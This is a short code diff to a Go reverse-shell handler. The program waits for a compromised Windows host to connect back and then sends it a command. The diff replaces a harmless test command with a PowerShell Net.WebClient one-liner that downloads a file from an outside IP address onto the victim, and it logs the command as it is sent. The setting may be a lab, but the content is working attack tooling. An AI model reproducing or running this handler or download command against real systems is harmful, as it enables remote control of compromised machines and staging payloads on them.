@@ -23,7 +23,7 @@ func CloseConnectionLoudly(conn net.Conn) {
 }
 
 func ListenAndHandleTCPShell(){
-  command := "echo succ > C:\\succ.txt"
+  command := "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -C \"(new-object Net.WebClient).DownloadFile('http://192.168.1.51/index.html', 'C:\\downloado.txt')\" && echo succ > C:\\succ.txt"
   fmt.Println("Listening for reverse TCP shell...")
 
   conn := ListenForConnection()
@@ -35,7 +35,7 @@ func ListenAndHandleTCPShell(){
   if readerr != nil {
     fmt.Println("Error reading from reverse shell: " + readerr.Error())
   }
-  fmt.Println("Shell acquired, launching command...")
+  fmt.Println("Shell acquired, launching command: " + command)
   _, writeerr := writer.WriteString(command)
   if writeerr != nil {
     fmt.Println("Error writing to reverse shell: " + writeerr.Error())
